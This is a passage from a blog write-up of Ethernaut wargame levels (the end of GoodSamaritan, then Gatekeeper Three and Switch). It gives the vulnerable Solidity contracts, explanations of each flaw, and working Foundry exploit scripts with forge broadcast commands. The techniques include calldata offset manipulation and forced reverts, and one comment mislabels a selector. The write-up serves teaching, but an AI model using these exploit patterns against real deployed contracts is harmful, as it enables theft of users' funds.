        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Wallet Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">gs</span><span class="p">.</span><span class="nf">wallet</span><span class="p">()));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Coin Address : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">gs</span><span class="p">.</span><span class="nf">coin</span><span class="p">()));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Balance of Wallet</span><span class="dl">"</span><span class="p">,</span> <span class="nx">gs</span><span class="p">.</span><span class="nf">coin</span><span class="p">().</span><span class="nf">balances</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">gs</span><span class="p">.</span><span class="nf">wallet</span><span class="p">())));</span>

        <span class="k">new</span> <span class="nc">Attack</span><span class="p">().</span><span class="nf">exploit</span><span class="p">();</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Balance of Wallet</span><span class="dl">"</span><span class="p">,</span> <span class="nx">gs</span><span class="p">.</span><span class="nf">coin</span><span class="p">().</span><span class="nf">balances</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">gs</span><span class="p">.</span><span class="nf">wallet</span><span class="p">())));</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">error</span> <span class="nc">NotEnoughBalance</span><span class="p">();</span>
    <span class="nx">GoodSamaritan</span> <span class="kr">public</span> <span class="nx">gs</span> <span class="o">=</span> <span class="nc">GoodSamaritan</span><span class="p">(</span><span class="mh">0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
        <span class="nx">gs</span><span class="p">.</span><span class="nf">requestDonation</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">notify</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nf">if</span><span class="p">(</span><span class="nx">amount</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">){</span> <span class="c1">// only revert when receiving 10 coins</span>
            <span class="nx">revert</span> <span class="nc">NotEnoughBalance</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/GoodSamaritanSolve.s.sol:GoodSamaritanSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="28-gatekeeper-three">28 Gatekeeper Three</h1>

<p><code class="language-plaintext highlighter-rouge">GatekeeperThree.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">SimpleTrick</span> <span class="p">{</span>
  <span class="nx">GatekeeperThree</span> <span class="kr">public</span> <span class="nx">target</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">trick</span><span class="p">;</span>
  <span class="nx">uint</span> <span class="kr">private</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span>

  <span class="nf">constructor </span><span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span> <span class="nx">_target</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">target</span> <span class="o">=</span> <span class="nc">GatekeeperThree</span><span class="p">(</span><span class="nx">_target</span><span class="p">);</span>
  <span class="p">}</span>
    
  <span class="kd">function</span> <span class="nf">checkPassword</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_password</span><span class="p">)</span> <span class="kr">public</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">if </span><span class="p">(</span><span class="nx">_password</span> <span class="o">==</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">password</span> <span class="o">=</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
    
  <span class="kd">function</span> <span class="nf">trickInit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">trick</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
  <span class="p">}</span>
    
  <span class="kd">function</span> <span class="nf">trickyTrick</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">if </span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="o">==</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">&amp;&amp;</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">trick</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">target</span><span class="p">.</span><span class="nf">getAllowance</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">GatekeeperThree</span> <span class="p">{</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">entrant</span><span class="p">;</span>
  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">allowEntrance</span><span class="p">;</span>

  <span class="nx">SimpleTrick</span> <span class="kr">public</span> <span class="nx">trick</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nf">construct0r</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
      <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nf">gateOne</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">);</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span> <span class="o">!=</span> <span class="nx">owner</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nf">gateTwo</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">allowEntrance</span> <span class="o">==</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">modifier</span> <span class="nf">gateThree</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">if </span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">&gt;</span> <span class="mf">0.001</span> <span class="nx">ether</span> <span class="o">&amp;&amp;</span> <span class="nf">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="mf">0.001</span> <span class="nx">ether</span><span class="p">)</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">getAllowance</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_password</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">if </span><span class="p">(</span><span class="nx">trick</span><span class="p">.</span><span class="nf">checkPassword</span><span class="p">(</span><span class="nx">_password</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">allowEntrance</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">createTrick</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">trick</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimpleTrick</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
    <span class="nx">trick</span><span class="p">.</span><span class="nf">trickInit</span><span class="p">();</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">enter</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">gateOne</span> <span class="nx">gateTwo</span> <span class="nx">gateThree</span> <span class="p">{</span>
    <span class="nx">entrant</span> <span class="o">=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nf">receive </span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Cope with gates and become an entrant.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>Similar to GatekeeperOne and GatekeeperTwo we need to pass the three gate checks by the modifiers when calling the <code class="language-plaintext highlighter-rouge">enter()</code> function.</li>
  <li><code class="language-plaintext highlighter-rouge">gateOne()</code> can be bypassed if we are the owner of the contract and we need call from a contract.</li>
  <li>To be be the owner we can call the <code class="language-plaintext highlighter-rouge">construct0r()</code> function its not the actual constructor(), so we can be the owner after calling it.</li>
  <li><code class="language-plaintext highlighter-rouge">gateTwo()</code> will be passed if we managed to change the <code class="language-plaintext highlighter-rouge">allowEntrance</code> value to true. To do it, we need to call the <code class="language-plaintext highlighter-rouge">getAllowance()</code> function with the right password defined inside SimpleTrick contract.</li>
  <li>So, we need to deploy a SimpleTrick contract first, we can do this by calling <code class="language-plaintext highlighter-rouge">createTrick()</code> function.</li>
  <li>After that we need to find the password stored inside SimpleTrick contract. We can do this by using <code class="language-plaintext highlighter-rouge">vm.load</code> cheatcode or we can find the password inside our Attack contract.</li>
  <li>Because the password is the <code class="language-plaintext highlighter-rouge">block.timestamp</code> which will be same during a transaction. If we deploy the SimpeToken and get the block.timestamp inside same call, the block.timestamp will be the password for us.</li>
  <li>Callling <code class="language-plaintext highlighter-rouge">getAllowance()</code> with this value will pass the gateTwo.</li>
  <li>For <code class="language-plaintext highlighter-rouge">gateThree()</code> the balance of the GatekeeperThree should be greater than 0.001 ether and when the GatekeeperThree sends 0.001 ether to owner it should return false.</li>
  <li>Remember owner is out attack contract, GatekeeperThree sending ether using <code class="language-plaintext highlighter-rouge">send</code> call. <code class="language-plaintext highlighter-rouge">send</code> call will return <code class="language-plaintext highlighter-rouge">false</code> when the transaction fails.</li>
  <li>So, we have to deny the ether sent by the GatekeeperThree. To do this, I haven’t implemented any fallback or receive function inside my Attack contract.</li>
  <li>For this reason the send will return false to GatekeeperThree contract and now we will able to register as entrant.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">GatekeeperThreeSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">../src/GatekeeperThree.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">GatekeeperThreeSolve</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
    <span class="nx">GatekeeperThree</span> <span class="kr">public</span> <span class="nx">gate</span> <span class="o">=</span> <span class="nc">GatekeeperThree</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0x152e56fe5FEC16f910Ea83294dD321a0c8380193</span><span class="p">));</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Gate Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">gate</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>

        <span class="c1">// address trick = gate.trick().trick();</span>
        <span class="c1">// console.log("Trick Address : ", trick);</span>
        <span class="c1">// bytes32 _password = vm.load(trick, bytes32(uint(2)));</span>
        <span class="c1">// uint password = uint(_password);</span>
        <span class="c1">// console.log("Password : ", password);</span>

        <span class="nx">Attack</span> <span class="nx">attack</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Attack</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.002</span> <span class="nx">ether</span><span class="p">}();</span>
        <span class="nx">attack</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Allow Entrance : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">gate</span><span class="p">.</span><span class="nf">allowEntrance</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Gate Owner : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">gate</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Entrant : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">gate</span><span class="p">.</span><span class="nf">entrant</span><span class="p">());</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">GatekeeperThree</span> <span class="kr">public</span> <span class="nx">gate</span> <span class="o">=</span> <span class="nc">GatekeeperThree</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0x152e56fe5FEC16f910Ea83294dD321a0c8380193</span><span class="p">));</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span><span class="p">{}</span>
    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">gate</span><span class="p">.</span><span class="nf">construct0r</span><span class="p">();</span>

        <span class="nx">gate</span><span class="p">.</span><span class="nf">createTrick</span><span class="p">();</span>
        <span class="nx">gate</span><span class="p">.</span><span class="nf">getAllowance</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>

        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nf">payable</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">gate</span><span class="p">)).</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span> <span class="p">:</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">}(</span><span class="dl">""</span><span class="p">);</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Tx Failed</span><span class="dl">"</span><span class="p">);</span>

        <span class="nx">gate</span><span class="p">.</span><span class="nf">enter</span><span class="p">();</span>

    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/GatekeeperThreeSolve.s.sol:GatekeeperThreeSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="29-switch">29 Switch</h1>

<p><code class="language-plaintext highlighter-rouge">Switch.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Switch</span> <span class="p">{</span>
    <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">switchOn</span><span class="p">;</span> <span class="c1">// switch is off</span>
    <span class="nx">bytes4</span> <span class="kr">public</span> <span class="nx">offSelector</span> <span class="o">=</span> <span class="nf">bytes4</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="dl">"</span><span class="s2">turnSwitchOff()</span><span class="dl">"</span><span class="p">));</span>

     <span class="nx">modifier</span> <span class="nf">onlyThis</span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Only the contract can call this</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nx">modifier</span> <span class="nf">onlyOff</span><span class="p">()</span> <span class="p">{</span>
        <span class="c1">// we use a complex data type to put in memory</span>
        <span class="nx">bytes32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="nx">memory</span> <span class="nx">selector</span><span class="p">;</span>
        <span class="c1">// check that the calldata at position 68 (location of _data)</span>
        <span class="nx">assembly</span> <span class="p">{</span>
            <span class="nf">calldatacopy</span><span class="p">(</span><span class="nx">selector</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="c1">// grab function selector from calldata</span>
        <span class="p">}</span>
        <span class="nf">require</span><span class="p">(</span>
            <span class="nx">selector</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nx">offSelector</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">Can only call the turnOffSwitch function</span><span class="dl">"</span>
        <span class="p">);</span>
        <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">flipSwitch</span><span class="p">(</span><span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_data</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">onlyOff</span> <span class="p">{</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nf">call</span><span class="p">(</span><span class="nx">_data</span><span class="p">);</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span> <span class="dl">"</span><span class="s2">call failed :(</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">turnSwitchOn</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyThis</span> <span class="p">{</span>
        <span class="nx">switchOn</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">turnSwitchOff</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">onlyThis</span> <span class="p">{</span>
        <span class="nx">switchOn</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Just have to flip the switch.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>Switch contract has three functions <code class="language-plaintext highlighter-rouge">turnSwitchOff()</code>, <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> and <code class="language-plaintext highlighter-rouge">flipSwitch()</code>. In which we can only able to call flipSwitch function.</li>
  <li>By using this flipSwitch only we have to call the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> function. For this we need to pass the calldata for the function call <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code>.</li>
  <li>But If we pass the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> calldata to the <code class="language-plaintext highlighter-rouge">flipSwitch()</code> it will be reverted by <code class="language-plaintext highlighter-rouge">onlyOff</code> modifier.</li>
  <li>Because, onlyOff is checking that the calldata’s 68 to 72 bytes should only contain the signature of the <code class="language-plaintext highlighter-rouge">turnSwitchOff()</code> function.</li>
  <li>The vulnerability is present inside the <code class="language-plaintext highlighter-rouge">onlyOff()</code> modifier as its function signature check byte position is hardcoded (68,4).</li>
  <li>We can modify the calldata in order to bypass the check and as well as call the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> function.</li>
  <li>Lets understand <code class="language-plaintext highlighter-rouge">calldata</code> specificly when passing dynamic datatypes as arguments</li>
  <li>When we call a function on a contract, the calldata will be sent via the transaction as <code class="language-plaintext highlighter-rouge">msg.data</code>, Lets see what this data consists.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> calldata with dynamic arguments
   =&gt; &lt;function signature&gt; &lt;offset&gt; &lt;length of data&gt; &lt;data&gt;
 Each field will be padded to 32 bytes except function signature.

 calldata when we call flipSwitch() with turnSwitchOff() function signature 
      30c13ade  // flipSwitch() signature
 00 : 0000000000000000000000000000000000000000000000000000000000000020   ==&gt; offset - the starting position of the actual data 
 20 : 0000000000000000000000000000000000000000000000000000000000000004   ==&gt; length - data length
 40 : 20606e1500000000000000000000000000000000000000000000000000000060   ==&gt; data - data that we passed through argument (turnSwitchOff() signature)
</code></pre></div>    </div>
  </li>
  <li>This call to flipSwitch() is succeeded because the check was passed. The check is that from the 68th byte to 72nd byte will be sliced out and this will be checked with the signature of the <code class="language-plaintext highlighter-rouge">turnSwitchOff()</code> function.</li>
  <li>Now we somehow should manage to send the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> signature along with this calldata. And we should make sure that only <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> signature should be passed to the <code class="language-plaintext highlighter-rouge">call</code> inside <code class="language-plaintext highlighter-rouge">flipSwitch()</code>.</li>
  <li>The data which is used inside the function will be specified by the <code class="language-plaintext highlighter-rouge">offset</code>. The function will make use of the actual data that is pointed by the offset.</li>
  <li>As the <code class="language-plaintext highlighter-rouge">onlyOff</code> modifier uses the hardcoded check, we can modify the calldata to be able to insert the <code class="language-plaintext highlighter-rouge">turnSwitchOff()</code> function signature at the 68th bytes and append the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> signature.</li>
  <li>Now we have to change the offset of the calldata in such a way that it points to the <code class="language-plaintext highlighter-rouge">turnSwitchOn()</code> signature.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>calldata to bypass onlyOff
  =&gt; &lt;flipSwitch Singature&gt; &lt;Offset&gt; &lt;Dummy Data&gt; &lt;turnSwitchOff Signature&gt; &lt;length of data&gt; &lt;turnSwitchOn Signature&gt;

   30c13ade
  00 : 00000000000000000000000000000000000000000000000000000000000000[60]  ==&gt; Offset - position of actual data
  20 : 0000000000000000000000000000000000000000000000000000000000000000     ==&gt; Dummy data - to move turnSwitchOff data to 68th byte
  40 : 20606e1500000000000000000000000000000000000000000000000000000000  ==&gt; Data - turnSwitchOff() selector (By passes onlyOff)
  60 : 0000000000000000000000000000000000000000000000000000000000000004  ==&gt; Length - Length of the turnSwitchOff() signature data
  80 : 76227e1200000000000000000000000000000000000000000000000000000000  ==&gt; Actual data - turnSwitchOff() signature
</code></pre></div>    </div>
  </li>
  <li>Now this calldata will bypasses the check of onlyOff and we modified the offset to point it to the turnSwitchOn() signature.</li>
  <li>So, now the calldata passed to the <code class="language-plaintext highlighter-rouge">call</code> inside flipSwitch() will be,
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>76227e1200000000000000000000000000000000000000000000000000000000
</code></pre></div>    </div>
  </li>
  <li>This will call the turnSwitchOn() function in Switch contract. Finally we will be able to solve the challenge.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">SwitchSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">../src/Switch.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">SwitchSolve</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
    <span class="nx">Switch</span> <span class="kr">public</span> <span class="nx">sw</span> <span class="o">=</span> <span class="nc">Switch</span><span class="p">(</span><span class="mh">0x8592a0765f942ba46ADf3a0EB1fF57b1d74664F0</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Switch  : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">sw</span><span class="p">.</span><span class="nf">switchOn</span><span class="p">());</span>

        <span class="c1">// bytes memory data = abi.encodeWithSignature("turnSwitchOff()");</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">flipSwitch(bytes)</span><span class="dl">"</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20606e1500000000000000000000000000000000000000000000000000000000</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x76227e1200000000000000000000000000000000000000000000000000000000</span><span class="p">);</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">logBytes</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>

        <span class="nf">address</span><span class="p">(</span><span class="nx">sw</span><span class="p">).</span><span class="nf">call</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>



        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Switch  : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">sw</span><span class="p">.</span><span class="nf">switchOn</span><span class="p">());</span>


        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/SwitchSolve.s.sol:SwitchSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<hr />

<p>That’s it for the write-up ! To connect with me send a request at <a href="https://www.twitter.com/TheMj0ln1r">@TheMj0ln1r</a></p>

<h2 id="references">References</h2>

<ol>
  <li><a href="https://github.com/x676f64/secureum-mind_map" target="_blank">Secureum Bootcamp</a></li>
  <li><a href="https://github.com/ethereumbook/ethereumbook" target="_blank">Mastering Ethereum</a></li>
</ol>

</article>
      </section>
    </div>
  </div>

   <footer>
  <a href="/">
    <span>
        <b>Mj0ln1r</b>
    </span>
    
    <span>© 2023
  </a>

  <a href="https://twitter.com/TheMj0ln1r" target="_blank">
  </span>/Twitter</span>
  </a>

  <a href="https://github.com/TheMj0ln1r" target="_blank">
  </span>/Github</span>
  </a>

  <a href="https://www.linkedin.com/in/mj0ln1r" target="_blank">
